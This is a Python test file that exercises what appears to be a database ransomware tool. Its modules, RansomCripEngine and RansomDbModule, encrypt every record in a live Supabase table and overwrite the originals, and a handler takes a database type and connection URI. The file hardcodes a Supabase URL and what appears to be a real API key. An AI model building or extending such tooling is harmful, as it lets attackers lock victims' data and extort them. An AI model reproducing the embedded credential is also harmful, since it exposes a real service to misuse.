import os
import json
import hashlib
import urllib.request
import pytest

os.environ.setdefault("KEY_CRIP_DATA", "integration-test-key-2026")

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

_NONCE_LEN = 12

SUPA_URL = "https://woyzewbmfxefttghlvmx.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndveXpld2JtZnhlZnR0Z2hsdm14Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU4NDkyMTAsImV4cCI6MjA5MTQyNTIxMH0.Xho8mmEqW3vNkl2NNdwqHPdSl36RUJdIVQAEdMQ9lF8"
SUPA_URI = f"{SUPA_URL}|{SUPA_KEY}"


def _can_connect() -> bool:
    try:
        req = urllib.request.Request(f"{SUPA_URL}/rest/v1/data?select=*&limit=1", headers={
            "apikey": SUPA_KEY, "Authorization": f"Bearer {SUPA_KEY}",
        })
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status == 200
    except Exception:
        return False


def _decrypt(blob: bytes) -> bytes:
    key_bytes = hashlib.sha256(os.getenv("KEY_CRIP_DATA", "").encode("utf-8")).digest()
    return AESGCM(key_bytes).decrypt(blob[:_NONCE_LEN], blob[_NONCE_LEN:], None)


def _restore_originals():
    originals = [
        {"id": 1, "username": "alice", "email": "alice@corp.com", "secret": "api_key_123"},
        {"id": 2, "username": "bob", "email": "bob@corp.com", "secret": "token_456"},
        {"id": 3, "username": "carol", "email": "carol@corp.com", "secret": "password_789"},
    ]
    for r in originals:
        rid = r.pop("id")
        payload = json.dumps(r).encode()
        req = urllib.request.Request(
            f"{SUPA_URL}/rest/v1/data?id=eq.{rid}", data=payload, method="PATCH",
            headers={"apikey": SUPA_KEY, "Authorization": f"Bearer {SUPA_KEY}",
                     "Content-Type": "application/json", "Prefer": "return=minimal"},
        )
        urllib.request.urlopen(req, timeout=10)


skip_no_supa = pytest.mark.skipif(not _can_connect(), reason="Supabase não acessível")


@skip_no_supa
class TestRansomSupabase:

    @pytest.fixture(autouse=True)
    def restore_after(self):
        yield
        _restore_originals()

    def test_adapter_connects(self):
        from infra.adapters.nosql.SupabaseAdapter import SupabaseAdapter
        adapter = SupabaseAdapter(SUPA_URI)
        records = adapter.list_records()
        assert len(records) == 3

    def test_adapter_reads_data(self):
        from infra.adapters.nosql.SupabaseAdapter import SupabaseAdapter
        adapter = SupabaseAdapter(SUPA_URI)
        records = adapter.list_records()
        usernames = [r["username"] for r in records]
        assert "alice" in usernames
        assert "bob" in usernames
        assert "carol" in usernames

    def test_adapter_discovers_columns(self):
        from infra.adapters.nosql.SupabaseAdapter import SupabaseAdapter
        adapter = SupabaseAdapter(SUPA_URI)
        assert "username" in adapter._columns
        assert "email" in adapter._columns
        assert "secret" in adapter._columns
        assert "id" not in adapter._columns

    def test_encrypt_all_records(self):
        from infra.adapters.nosql.SupabaseAdapter import SupabaseAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        adapter = SupabaseAdapter(SUPA_URI)
        engine = RansomCripEngine()

        idx = [0]
        def write_fn(enc):
            adapter.overwrite(idx[0], enc)
            idx[0] += 1

        engine.execute(write_fn, adapter.list_records())
        assert idx[0] == 3

    def test_encrypted_data_in_supabase(self):
        from infra.adapters.nosql.SupabaseAdapter import SupabaseAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        adapter = SupabaseAdapter(SUPA_URI)
        engine = RansomCripEngine()

        idx = [0]
        def write_fn(enc):
            adapter.overwrite(idx[0], enc)
            idx[0] += 1
        engine.execute(write_fn, adapter.list_records())

        req = urllib.request.Request(f"{SUPA_URL}/rest/v1/data?select=*&order=id", headers={
            "apikey": SUPA_KEY, "Authorization": f"Bearer {SUPA_KEY}",
        })
        with urllib.request.urlopen(req, timeout=10) as resp:
            final = json.loads(resp.read().decode())

        for r in final:
            assert len(r["username"]) > 40
            bytes.fromhex(r["username"])

    def test_roundtrip_decrypt(self):
        from infra.adapters.nosql.SupabaseAdapter import SupabaseAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        adapter = SupabaseAdapter(SUPA_URI)
        engine = RansomCripEngine()

        idx = [0]
        def write_fn(enc):
            adapter.overwrite(idx[0], enc)
            idx[0] += 1
        engine.execute(write_fn, adapter.list_records())

        req = urllib.request.Request(f"{SUPA_URL}/rest/v1/data?select=*&order=id", headers={
            "apikey": SUPA_KEY, "Authorization": f"Bearer {SUPA_KEY}",
        })
        with urllib.request.urlopen(req, timeout=10) as resp:
            final = json.loads(resp.read().decode())

        blob = bytes.fromhex(final[0]["username"])
        decrypted = _decrypt(blob)
        original = json.loads(decrypted)
        assert original["username"] == "alice"
        assert original["email"] == "alice@corp.com"

    def test_full_ransomdb_pipeline(self):
        from infra.modules.RansomDbModule import RansomDbModule
        module = RansomDbModule(broadcast=lambda _: None)
        count = module._run_nosql("Supabase", SUPA_URI)
        assert count == 3

    @pytest.mark.asyncio
    async def test_handle_ransom_db(self):
        from infra.modules.RansomDbModule import RansomDbModule
        module = RansomDbModule(broadcast=lambda _: None)
        result = await module._handle_ransom_db({
            "db": "Supabase",
            "mode": "single",
            "uri": SUPA_URI,
        })
        assert result.success is True
        assert result.data["encrypted"] == 3
        assert result.data["db"] == "Supabase"
